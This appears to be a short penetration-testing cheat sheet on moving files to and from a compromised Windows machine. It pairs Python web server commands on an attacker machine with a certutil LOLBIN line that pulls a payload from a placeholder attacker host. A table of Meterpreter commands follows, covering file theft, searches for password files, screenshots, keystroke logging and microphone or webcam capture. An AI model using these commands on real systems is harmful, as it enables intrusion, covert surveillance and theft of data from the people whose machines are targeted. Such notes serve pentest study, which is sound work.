# Windows

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Python web server

Attacker computer

```bash
python -m SimpleHTTPServer 80 : use port that is not used  
```

```bash
python3 -m http.Server 80
```

Download from target

```bash
certutil -urlcache -f http://attackeraddress/filename <fileNameWhenDownloaded>    
```

| Part                              | Purpose                                               |
| --------------------------------- | ----------------------------------------------------- |
| `certutil`                        | Built-in Windows utility for cert management (LOLBIN) |
| `-urlcache`                       | Uses the URL cache functionality to fetch the file    |
| `-f`                              | Force download even if cached                         |
| `http://attackeraddress/filename` | Remote URL of the payload or file                     |
| `<fileNameWhenDownloaded>`        | Name to save the file as on disk                      |

{% hint style="warning" %}
imporant when we dont have a meterpreter seassion and we need to download or upload files using the system unitilitys services.
{% endhint %}

## Metasploit commands

| Command                          | Function                                                 |
| -------------------------------- | -------------------------------------------------------- |
| `download /path/to/file`         | Downloads a specific file from the target                |
| `upload /local/file`             | Uploads a file to the target                             |
| `search -f *.docx`               | Finds files (e.g., `*.docx`, `*.xlsx`, `passwords.txt`)  |
| `cat /path/to/file`              | View file content inline                                 |
| `screenshot`                     | Take a screenshot of the userâ€™s desktop                  |
| `keyscan_start` / `keyscan_dump` | Start and dump keystrokes                                |
| `record_mic` / `webcam_snap`     | Record audio or take webcam shots (if permissions allow) |
